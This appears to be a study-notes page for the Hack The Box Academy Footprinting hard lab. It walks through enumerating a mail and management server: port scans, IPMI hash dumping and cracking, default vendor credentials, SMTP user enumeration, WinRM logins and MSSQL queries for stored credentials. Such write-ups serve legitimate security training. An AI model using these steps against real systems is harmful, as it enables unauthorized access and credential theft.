---
tags: [lab]
module: footprinting
last_updated: 2026-05-10
source_count: 1
---

# HTB Footprinting Lab — Hard

HTB Academy Footprinting module hard lab: MX/management server doubling as internal domain backup server — enumerate mail, remote management, and database services to obtain HTB user credentials.

## Target Info

- **Client**: Inlanefreight Ltd
- **Target**: MX and management server; backup server for internal domain accounts
- **Constraint**: No aggressive exploitation
- **Goal**: Obtain credentials for user `HTB`
- **Proof**: HTB user credentials

## Approach / Methodology

"MX and management server" combined with "backup server for internal accounts" points to several service families:
- **Mail**: SMTP (25/587), IMAP (143/993), POP3 (110/995)
- **Remote management**: WinRM (5985/5986), RDP (3389), SSH (22)
- **Database**: MSSQL (1433), MySQL (3306) — often used for mail backend
- **IPMI**: UDP 623 — management server may have BMC exposed

The "backup for internal accounts" detail suggests this server has a replica of domain credentials or holds sensitive account data.

### Phase 1: Comprehensive Port Scan

```bash
# Full TCP port scan
sudo nmap -sV -sC -p- --open 10.129.x.x

# UDP scan (IPMI, SNMP)
sudo nmap -sU -p161,623 10.129.x.x
```

### Phase 2: IPMI Enumeration (Management Server)

"Management server" + UDP 623 = IPMI. Always check this first on management servers.

```bash
# Check IPMI version
sudo nmap -sU --script ipmi-version -p623 10.129.x.x

# Dump hashes via RAKP flaw
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set rhosts 10.129.x.x
msf6 > run

# Crack the hash
hashcat -m 7300 ipmi_hash.txt /usr/share/wordlists/rockyou.txt
```

Default credentials to try: `ADMIN:ADMIN`, `root:calvin`, `Administrator:<randomized>`.

### Phase 3: Mail Service Enumeration

As the MX server, SMTP/IMAP/POP3 are core services:

```bash
# Scan mail ports
sudo nmap 10.129.x.x -sV -p25,110,143,587,465,993,995 -sC

# SMTP — check for open relay and user enumeration
sudo nmap 10.129.x.x -p25 --script smtp-open-relay -v
telnet 10.129.x.x 25
EHLO test.com
VRFY HTB

# IMAP — if credentials found, access mailbox
curl -k 'imaps://10.129.x.x' --user HTB:password
openssl s_client -connect 10.129.x.x:imaps
```

### Phase 4: Remote Management — WinRM/RDP

"Management server" implies Windows-based remote access is likely:

```bash
# WinRM
nmap -sV -sC 10.129.x.x -p5985,5986 --disable-arp-ping -n

# RDP
nmap -sV -sC 10.129.x.x -p3389 --script rdp*

# Test WinRM with found credentials
evil-winrm -i 10.129.x.x -u HTB -p <password>
```

### Phase 5: Database Enumeration

Backup of "internal domain accounts" suggests a database backend:

```bash
# MSSQL
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info \
    -sV -p1433 10.129.x.x

# MySQL
sudo nmap 10.129.x.x -sV -sC -p3306 --script mysql*

# Connect to MSSQL with blank sa password
impacket-mssqlclient sa@10.129.x.x

# Enumerate databases for HTB user credentials
SQL> select name from sys.databases
SQL> use <database>
SQL> select * from users  -- look for HTB user
```

### Phase 6: Correlation and Access

The HTB credentials likely require chaining multiple findings:

1. **IPMI hash → cracked password** → used for SSH/WinRM login
2. **SMTP VRFY** → confirms HTB user exists → combined with cracked IPMI password
3. **Database → HTB user credentials** → direct answer
4. **IMAP access** → emails contain credentials

Typical hard lab flow:
- Find IPMI, crack hash → login to system
- Use system access to find database credentials
- Query database for HTB user entry
- Return credentials as proof

## Key Techniques Used

1. **IPMI RAKP hash dump** — management server flag is the trigger
2. **SMTP user enumeration** — VRFY confirms HTB user exists on system
3. **Database enumeration** — MSSQL/MySQL query for backup account data
4. **Service chaining** — IPMI password reused for SSH/WinRM/RDP

## Lessons Learned

- "Management server" is a direct cue for IPMI — check UDP 623 immediately on any management infrastructure.
- "Backup of domain accounts" suggests a database (possibly MSSQL/MySQL) containing credential dumps — query `sys.databases` and look for HR, accounts, or backup tables.
- Mail servers expose user enumeration via SMTP VRFY — always enumerate valid usernames before attempting authentication.
- IPMI hashes should be cracked immediately upon retrieval — even complex passwords can be in rockyou. For HP iLO, use the mask attack.
- This lab demonstrates the value of checking *all* services systematically rather than fixating on the "MX server" label — the actual credential is often in an adjacent service.

## Related Pages

- [[enumeration/ipmi]]
- [[enumeration/smtp]]
- [[enumeration/imap_pop3]]
- [[enumeration/mssql]]
- [[enumeration/mysql]]
- [[enumeration/windows_remote_mgmt]]

## Sources

- raw/footprinting/footprinting_lab_hard.md
